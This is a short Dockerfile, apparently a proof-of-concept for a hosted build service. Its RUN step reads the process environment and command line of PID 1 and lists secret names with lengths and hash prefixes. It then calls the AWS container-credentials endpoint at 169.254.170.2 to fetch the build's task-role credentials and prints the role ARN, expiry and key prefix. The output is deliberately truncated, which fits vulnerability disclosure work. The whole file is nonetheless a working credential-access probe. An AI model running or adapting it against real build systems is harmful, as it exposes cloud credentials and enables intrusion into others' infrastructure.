# Build-environment probe: prints env var names/lengths/hash prefixes only, then fails.
FROM python:3.13-alpine
EXPOSE 8080
RUN python3 -c "import hashlib,json,sys,urllib.request as r; raw=open('/proc/1/environ','rb').read().split(b'\0'); env=dict(e.split(b'=',1) for e in raw if b'=' in e); skip={b'PATH',b'HOME',b'HOSTNAME',b'DOCKER_CONFIG',b'TZ',b'LANG'}; print('=== PoC: PID 1 cmdline:', open('/proc/1/cmdline','rb').read().replace(b'\0',b' ').decode(), file=sys.stderr); [print('PID1-ENV', k.decode(), 'len=%d' % len(v), 'sha8=' + hashlib.sha256(v).hexdigest()[:8], file=sys.stderr) for k, v in sorted(env.items()) if k not in skip]; u=env.get(b'AWS_CONTAINER_CREDENTIALS_RELATIVE_URI', b'').decode(); exec('try:\n c=json.load(r.urlopen(\"http://169.254.170.2\"+u, timeout=3)) if u else {}\n print(\"TASK-ROLE RoleArn=%s Expiration=%s AccessKeyId-prefix=%s\" % (c.get(\"RoleArn\"), c.get(\"Expiration\"), (c.get(\"AccessKeyId\") or \"\")[:4]), file=sys.stderr)\nexcept Exception as e:\n print(\"TASK-ROLE endpoint error:\", type(e).__name__, file=sys.stderr)')"; exit 1
